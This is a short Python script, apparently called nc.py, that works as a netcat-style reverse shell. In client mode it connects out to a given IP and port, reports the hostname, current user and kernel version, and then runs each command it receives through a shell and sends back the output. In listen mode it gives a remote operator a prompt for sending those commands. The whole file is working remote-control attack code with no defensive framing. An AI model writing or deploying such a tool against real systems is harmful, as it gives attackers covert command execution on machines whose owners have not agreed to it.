import socket
import os
import sys
import subprocess


def send_command(con):
    client_response = con.recv(2048)
    string_temp = client_response.decode("utf-8")
    print(string_temp)

    while True:
        cmd = input("$")
        con.send(str.encode(cmd))
        client_response = con.recv(2048)
        string_temp = client_response.decode("utf-8")
        print(string_temp)
        if cmd == "exit":
            con.close()
            sys.exit()


def server_listen(temp):
    ip = temp[0]
    port = int(temp[1])
    print(ip, port)
    serv_add = (ip,port)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((serv_add))
    s.listen(5)
    con,addr = s.accept()
    send_command(con)
    con.close()


def client_connect(temp):
    ip = temp[0]
    port = int(temp[1])
    con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        con.connect((ip, port))
    except:
        print("Server not found")
        sys.exit()
    connect_server(con)


def connect_server(con):
    information = ""
    hostname = "Hostname\t: " + information_gather("hostname")
    current_user = "User\t\t: " + information_gather("whoami")
    kernel_version = "Kernel Version\t: " + information_gather("uname -v")
    information += hostname + current_user + kernel_version
    con.send(information.encode())
    
    while True:
        res = con.recv(2048)
        if res.decode("utf-8") == "exit":
            con.close()
            sys.exit()
        else:
            cmd = subprocess.Popen(res.decode("utf-8"), shell=True,  stdout=subprocess.PIPE,  stdin=subprocess.PIPE)
            output_ = cmd.stdout.read()
            if output_ == b'':
                output_ = b'success'
            con.send(output_)
    con.close()


def information_gather(cmd):
    cmd = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
    output = cmd.stdout.read().decode()
    return output


def help():
    print("Option")
    print("-l \t\t listen")
    print("python3 nc.py [IP]:[PORT] option")

def main():    
    temp = []
    try:
        temp = sys.argv[1].split(":")
        if not temp[1].isnumeric():
            sys.exit()
    except:
        help()
        sys.exit()

    if len(sys.argv) == 2:
        client_connect(temp)
    elif len(sys.argv) == 3 and sys.argv[2] == '-l':
        server_listen(temp)
    else:
        help()
        sys.exit()


if __name__ == '__main__':
    main()
    